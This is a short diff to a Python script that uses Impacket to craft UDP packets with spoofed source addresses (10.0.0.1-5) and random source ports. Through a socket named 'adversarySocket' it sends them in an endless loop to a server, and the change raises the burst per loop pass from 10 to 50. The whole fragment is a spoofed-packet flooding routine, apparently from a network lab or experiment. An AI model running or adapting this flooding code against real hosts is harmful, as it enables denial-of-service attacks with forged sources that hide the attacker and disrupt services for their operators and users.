@@ -23,7 +23,7 @@ udp.contains(ImpactPacket.Data(message))
 ip.contains(udp)
 
 while (True):
-	for i in range(10):
+	for i in range(50):
 		udp.set_uh_sport(randint(50000, 60000))
 		ip.set_ip_src('10.0.0.' + str(randint(1, 5)))
 		adversarySocket.sendto(ip.get_packet(), (SERVER_ADDR, PORT))
